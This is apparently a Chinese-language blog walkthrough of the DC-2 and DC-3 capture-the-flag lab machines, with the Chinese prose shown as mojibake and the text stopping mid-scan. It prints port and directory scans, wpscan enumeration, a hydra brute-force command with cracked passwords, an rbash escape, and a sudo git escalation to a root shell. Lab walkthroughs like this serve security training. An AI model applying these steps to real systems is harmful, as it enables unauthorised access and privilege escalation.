<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ç»“æœï¼š</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">80&#x2F;tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http:&#x2F;&#x2F;dc-2&#x2F;</span><br><span class="line">7744&#x2F;tcp open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">| ssh-dss AAAAB3NzaC1kc3MAAACBAMT3xv0ReIK733JHqB5o5t1Knur7MHfTeYoqdn2fxpfdk79iDYAD46e&#x2F;C1hLs6R0CH1fSWfpJ0x45g77ZaEn&#x2F;nOaR2UXiod20R6kyrAPyL4UELizECoJ9MdHSULedr0+4QcXhtUZ+4b76umJhENpOhH+vZjrjMI5uZo+EMjlylxFAAAAFQDzg8StOWpV7J5ZjSfIdcddFgqB&#x2F;QAAAIA84WMMKmOEkvzgQZLuW5lTTecIrk+UXJyWVZSZFxvFbnt5mUvEzPBMqPZIo1h1dkzpEp1Xpk9Vb16LMrQcS6LgH8yhlo5402lUCfP6onxVNvGvP5uhLoQVjzPd65ZKJ7J1VSoz9xOmPkWr2HFuCf6XOBXy8WCxqZxWYTYERTuexgAAAIAI8DjfDmIjv0jUBAPZu0crpPoxvK4ZvdEy6UbfjK+pZYzkd6qnVLdWrvP9evbWaA5VoDZjWp1301VjX8Y1pqHFVaRUu3OBY7DgidJXA3zLd1BSdPzYfRJSZ1&#x2F;xN75Yo13wW6XIEsy1kvUNOwA0Nm6zmcQ+SN&#x2F;aBITwGOIBGrp06w&#x3D;&#x3D;</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC92AIbO8wDuOXLMCrnJkTKDLxXzpwFY0EI4urz6cZpmOjGOZYbWz6Ele1sM3WXEWmOWkszLrMbVEFmuYan545oIHnylYX6ZY+eMPjJBRH&#x2F;VDukRsNtAA8VRsvIkfCtcG5J9zAQTQDYYprEJljKPYavf4bIW3NZb0v57O01tGylLh23ZSfGpTmQXx+GsWet9vnbCr1+bzf&#x2F;QeZ7PNK9BeBsLJsvWgLQmuaTdBYeW1b415xOaszWrutHQoaBdud&#x2F;SPX1Uvy2PNFUfKIPjdbmAdRxTAvRHHaMTRdrvEhdJWz3wmefXr9e3S3YEu05USTqhMwi6OBxeqkjc+6mdR&#x2F;PYR9</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE329BkKjKxz7Y23cZSshQ76Ge3DFsJsTO89pgaInzX6w5G3h6hU3xDVMD8G8BsW3V0CwXWt1fTnT3bUc+JhdcE&#x3D;</span><br><span class="line">|   256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGyWHwWC3fLufEnM1R2zsvjMZ1TovPCp3mky&#x2F;2s+wXTH</span><br></pre></td></tr></table></figure>





<p>æˆ‘ä»¬è®¿é—®80ç«¯å£ï¼š</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-2.png" alt="2-2"></p>
<p>æˆ‘ä»¬å‘ç°è¢«é‡å®šå‘åˆ°dc-2ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é…ç½®é™æ€è·¯ç”±ï¼Œç›´æ¥ç”¨<strong>åŸŸåè®¿é—®</strong>ã€‚</p>
<blockquote>
<p>é…ç½®é™æ€è·¯ç”±ï¼š</p>
<p>linuxï¼š/etc/hosts</p>
<p>windows:C:\Windows\System32\drivers\etc\hosts</p>
</blockquote>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-3.png" alt="2-3"></p>
<p>æ‰«æä¸€ä¸‹ç›®å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[08:06:37] Starting: </span><br><span class="line">[08:06:46] 200 -   52KB - &#x2F;index.php                                                                                                    </span><br><span class="line">[08:06:47] 200 -   19KB - &#x2F;license.txt                                                                  </span><br><span class="line">[08:06:49] 200 -    7KB - &#x2F;readme.html                                                         </span><br><span class="line">[08:06:51] 301 -  319B  - &#x2F;wp-admin  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-admin&#x2F;                                          </span><br><span class="line">[08:06:52] 301 -  321B  - &#x2F;wp-content  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-content&#x2F;</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-content&#x2F;                </span><br><span class="line">[08:06:52] 200 -   69B  - &#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php                               </span><br><span class="line">[08:06:52] 500 -    0B  - &#x2F;wp-content&#x2F;plugins&#x2F;hello.php                       </span><br><span class="line">[08:06:52] 200 -    1B  - &#x2F;wp-admin&#x2F;admin-ajax.php           </span><br><span class="line">[08:06:52] 302 -    0B  - &#x2F;wp-admin&#x2F;  -&gt;  http:&#x2F;&#x2F;dc-2&#x2F;wp-login.php?redirect_to&#x3D;http%3A%2F%2F192.168.33.137%2Fwp-admin%2F&amp;reauth&#x3D;1</span><br><span class="line">[08:06:52] 301 -  322B  - &#x2F;wp-includes  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-includes&#x2F;</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-config.php                         </span><br><span class="line">[08:06:52] 200 -    2KB - &#x2F;wp-login.php</span><br><span class="line">[08:06:52] 200 -   40KB - &#x2F;wp-includes&#x2F;   </span><br><span class="line">[08:06:52] 302 -    0B  - &#x2F;wp-signup.php  -&gt;  http:&#x2F;&#x2F;dc-2&#x2F;wp-login.php?action&#x3D;register</span><br><span class="line">[08:06:52] 500 -    0B  - &#x2F;wp-includes&#x2F;rss-functions.php</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-cron.php</span><br><span class="line">[08:06:53] 500 -    4KB - &#x2F;wp-admin&#x2F;setup-config.php</span><br><span class="line">[08:06:53] 405 -   42B  - &#x2F;xmlrpc.php</span><br><span class="line">[08:06:53] 200 -    1KB - &#x2F;wp-admin&#x2F;install.php</span><br></pre></td></tr></table></figure>





<h2 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h2><p>å‘ç°flag1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably wonâ€™t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just canâ€™t win them all.	</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you canâ€™t find it, log in as another.</span><br></pre></td></tr></table></figure>



<h2 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æç¤ºé‡Œçš„cewlæ¥çˆ¬å–æœ‰å…³å¯†ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;dc-2&#x2F; -w dc2.txt</span><br></pre></td></tr></table></figure>

<p>å†ç”¨wpscanåˆ—å‡ºä¸€äº›ç”¨æˆ·åï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; --enumerate u</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;dc-2&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;dc-2&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å¯ä»¥bpçˆ†ç ´ï¼Œä¹Ÿå¯ä»¥hydraçˆ†ç ´ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt  -P passwd.txt dc-2 http-form-post &#39;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location&#39;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç”¨wpscanç›´æ¥çˆ†ç ´</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u -P  wordlist.txt</span><br></pre></td></tr></table></figure>







<h2 id="é—®é¢˜1ã€hydraã€‘"><a href="#é—®é¢˜1ã€hydraã€‘" class="headerlink" title="é—®é¢˜1ã€hydraã€‘"></a>é—®é¢˜1ã€hydraã€‘</h2><blockquote>
<p>æŠ“åŒ…çš„POSTæ•°æ®æ˜¯è¿™æ ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log&#x3D;admin&amp;pwd&#x3D;sit&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2Fdc-2%2Fwp-admin%2F&amp;testcookie&#x3D;1</span><br></pre></td></tr></table></figure>

<p>ä¸ºå•¥è¦æ”¹æˆä¸Šè¿°æ ·å­ï¼Ÿï¼Ÿï¼Ÿ</p>
</blockquote>
<p>çˆ†å‡ºä¸¤ä¸ªå¯†ç ï¼Œç™»å½•ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-04-13 08:39:16</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 714 login tries (l:3&#x2F;p:238), ~45 tries per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;dc-2:80&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location</span><br><span class="line">[80][http-post-form] host: dc-2   login: tom   password: parturient</span><br><span class="line">[80][http-post-form] host: dc-2   login: jerry   password: adipiscing</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2021-04-13 08:40:02</span><br></pre></td></tr></table></figure>



<p>ç™»å½•jerryï¼Œæ‰¾åˆ°flag2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>





<h2 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h2><p>æ­£å¸¸msfconsoleå—é˜»äº†ï¼Œæƒ³èµ·ä¹‹å‰ä¸€ä¸ª7744ç«¯å£ï¼Œå°è¯•sshç™»å½•ï¼ŒæˆåŠŸç™»å½•tomè´¦å·ï¼Œå‘ç°flag3.txtï¼Œä½†æ˜¯æ— æ³•ä½¿ç”¨catç­‰å‘½ä»¤<img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-4.png" alt="2-4"></p>
<p><strong>æ³•ä¸€</strong>ï¼šviå¯ä»¥ä½¿ç”¨ã€ä¸è¿‡æ„Ÿè§‰æœ‰ç‚¹å°èªæ˜ã€‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>



<p><strong>æ³•äºŒ</strong>ï¼šç»•è¿‡rbashï¼Œåˆ‡æ¢/bin/bash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>



<h2 id="flag4-1"><a href="#flag4-1" class="headerlink" title="flag4"></a>flag4</h2><p>çœ‹åˆ°flag3çš„å†…å®¹æƒ³åˆ°æ˜¯è¦ç»™tomææƒã€‚</p>
<p>åæ¥å‘ç°flag4åªè¦åˆ‡æ¢jerryå°±å¯ä»¥äº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#39;ve made it this far - but you&#39;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#39;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªfinalflagå¤§æ¦‚ç‡æ˜¯è¦åœ¨rootç›®å½•ä¸‹è·å–äº†ã€‚ã€å¯èƒ½è¿˜æ˜¯å’Œgitæœ‰å…³ã€‘</p>
<h2 id="thefinalflag-1"><a href="#thefinalflag-1" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>ä½¿ç”¨tomæ¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¸è¡Œï¼Œäºæ˜¯åˆ‡æ¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure>

<p>æ¥æ‰§è¡Œï¼Œå‘ç°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;git</span><br></pre></td></tr></table></figure>

<p>å‘ç°å¯ä»¥æ— å¯†ç æ‰§è¡Œrootçš„gitï¼</p>
<p>å…³äºgitææƒå¯ä»¥çœ‹<a href="https://gtfobins.github.io/gtfobins/git/#limited-suid" target="_blank" rel="noopener">è¿™ä¸ª</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>ææƒå®Œå³å¯å‘ç°finalflag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># cat final-flag.txt</span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">&#x2F; &#x2F; &#x2F;\ \ \___| | |   __| | ___  _ __   ___  &#x2F; \</span><br><span class="line">\ \&#x2F;  \&#x2F; &#x2F; _ \ | |  &#x2F; _&#96; |&#x2F; _ \| &#39;_ \ &#x2F; _ \&#x2F;  &#x2F;</span><br><span class="line"> \  &#x2F;\  &#x2F;  __&#x2F; | | | (_| | (_) | | | |  __&#x2F;\_&#x2F; </span><br><span class="line">  \&#x2F;  \&#x2F; \___|_|_|  \__,_|\___&#x2F;|_| |_|\___\&#x2F;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br><span class="line"></span><br><span class="line">A special thanks to all those who sent me tweets</span><br><span class="line">and provided me with feedback - it&#39;s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>





<p>SUIDææƒï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;exim4</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¸å¤ªè¡Œ</p>
<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="ä¿¡æ¯æ”¶é›†-2"><a href="#ä¿¡æ¯æ”¶é›†-2" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆnmapå‘ç°IPï¼š192.168.33.138</p>
<p>æ‰«ä¸€ä¸‹ç«¯å£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-18 08:39 EDT</span><br><span class="line">Nmap scan report for 192.168.33.138</span><br><span class="line">Host is up (0.00100s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80&#x2F;tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:4E:BC:23 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds</span><br></pre></td></tr></table></figure>

<p>åŠ å¼ºæ‰«ä¸€ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">MAC Address: 00:0C:29:4E:BC:23 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.007 days (since Sun Apr 18 08:30:26 2021)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;261 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br></pre></td></tr></table></figure>



<p>æµè§ˆå™¨è®¿é—®ä¸€ä¸‹ï¼š</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-1.png" alt="3-1"></p>
<p>å‘ç°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Welcome to DC-3.</span><br><span class="line">This time, there is only one flag, one entry point and no clues.</span><br><span class="line"></span><br><span class="line">To get the flag, you&#39;ll obviously have to gain root privileges.</span><br><span class="line"></span><br><span class="line">How you get to be root is up to you - and, obviously, the system.</span><br><span class="line"></span><br><span class="line">Good luck - and I hope you enjoy this little challenge.  :-)</span><br></pre></td></tr></table></figure>

<p>åªæœ‰ä¸€ä¸ªflag</p>
<p>dirsearchæ‰«ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u 192.168.33.138 -x 301,403</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[08:45:29] Starting: </span><br><span class="line">[08:45:32] 200 -   18KB - &#x2F;LICENSE.txt                                                                                                  </span><br><span class="line">[08:45:32] 200 -    4KB - &#x2F;README.txt                                   </span><br><span class="line">[08:45:35] 200 -   31B  - &#x2F;administrator&#x2F;cache&#x2F;                                                             </span><br><span class="line">[08:45:35] 200 -    2KB - &#x2F;administrator&#x2F;includes&#x2F; </span><br><span class="line">[08:45:35] 200 -    5KB - &#x2F;administrator&#x2F;          </span><br><span class="line">[08:45:35] 200 -    5KB - &#x2F;administrator&#x2F;index.php</span><br><span class="line">[08:45:35] 200 -   31B  - &#x2F;administrator&#x2F;logs&#x2F;     </span><br><span class="line">[08:45:36] 200 -   31B  - &#x2F;bin&#x2F;                                                                                   </span><br><span class="line">[08:45:36] 200 -   31B  - &#x2F;cache&#x2F;                                                                   </span><br><span class="line">[08:45:37] 200 -   31B  - &#x2F;cli&#x2F;                                                </span><br><span class="line">[08:45:37] 200 -   31B  - &#x2F;components&#x2F;                                         </span><br><span class="line">[08:45:37] 200 -    0B  - &#x2F;configuration.php                  </span><br><span class="line">[08:45:39] 200 -    3KB - &#x2F;htaccess.txt                                                               </span><br><span class="line">[08:45:39] 200 -   31B  - &#x2F;images&#x2F;                                 </span><br><span class="line">[08:45:39] 200 -   31B  - &#x2F;includes&#x2F;              </span><br><span class="line">[08:45:39] 200 -    7KB - &#x2F;index.php                                                                           </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;layouts&#x2F;                                                                     </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;libraries&#x2F;                                                                 </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;media&#x2F;                         </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;modules&#x2F;                    </span><br><span class="line">[08:45:42] 200 -   31B  - &#x2F;plugins&#x2F;                                                     </span><br><span class="line">[08:45:42] 200 -  836B  - &#x2F;robots.txt.dist                                                      </span><br><span class="line">[08:45:44] 200 -   31B  - &#x2F;templates&#x2F;                                                                             </span><br><span class="line">[08:45:44] 200 -   31B  - &#x2F;templates&#x2F;index.html    </span><br><span class="line">[08:45:44] 200 -    0B  - &#x2F;templates&#x2F;protostar&#x2F;              